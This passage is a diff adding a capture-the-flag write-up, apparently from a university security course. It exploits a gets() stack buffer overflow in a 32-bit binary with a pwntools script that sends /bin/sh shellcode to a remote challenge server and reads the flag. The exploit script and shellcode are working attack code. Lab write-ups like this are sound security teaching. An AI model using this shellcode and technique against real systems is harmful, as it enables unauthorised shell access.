@@ -183,3 +183,89 @@ is commented out. Now let's test our payload:
 
 And sure enough, we login as admin without knowing the password and get the
 flag!
+
+## CTF 2
+
+Like every pwn challenge, we start by running *checksec* on the binary:
+
+```sh
+$ checksec program
+Arch:     i386-32-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX disabled
+PIE:      PIE enabled
+RWX:      Has RWX segments
+```
+
+So, we have a 32bit binary with most protections disabled except for PIE. This
+means we can perform every attack we learned so far, but in the case of
+a buffer overflow, we need some way to leak some addresses, or the worst case
+go with trial and error. Let's examine the source code we are given:
+
+```c
+printf("Your buffer is %p.\n", buffer);
+gets(buffer);
+```
+
+From analizing this two lines of code, we detected an obvious buffer overflow,
+and also see that we are given the address of the buffer, defeating PIE. So our
+plan for exploiting will be:
+
+* Calculate offset between buffer and return address
+* Read from stdout the buffer address
+* Place shellcode at the start of our buffer (possible since stack is
+    executable)
+* Overwrite return address with pointer to the buffer that contains shellcode
+
+Using gdb to calculate offset:
+
+```sh
+gdb-peda$ p $ebp
+$1 = (void *) 0xffffd1c8
+gdb-peda$ p &buffer
+$2 = (char (*)[100]) 0xffffd160
+```
+
+So the offset is 0xffffd1c8 - 0xffffd160 + 4 = 108.
+And our exploit script will look like this:
+
+```py
+#!/bin/python3
+
+from pwn import *
+
+p = remote("ctf-fsi.fe.up.pt", 4001)
+
+p.recvuntil(b"Your buffer is ")
+bufStr = (p.recvline()).decode('utf-8')[:-2]
+p.recvuntil(b"Give me your input:")
+
+shellcode = (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+    "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+).encode('latin-1')
+
+buffer = bytearray(0x90 for i in range(112))
+retOffSet = 108
+buffer[:len(shellcode)] = shellcode
+L = 4
+buffer[retOffSet:retOffSet + L] = int(bufStr, base=16).to_bytes(L, byteorder='little')
+
+p.sendline(buffer)
+p.sendline(b'cat flag.txt')
+p.interactive()
+```
+
+Executing our script:
+
+```sh
+$ ./exploit.py
+[+] Opening connection to ctf-fsi.fe.up.pt on port 4001: Done
+[*] Switching to interactive mode
+
+flag{...}
+```
+
+We get our flag!
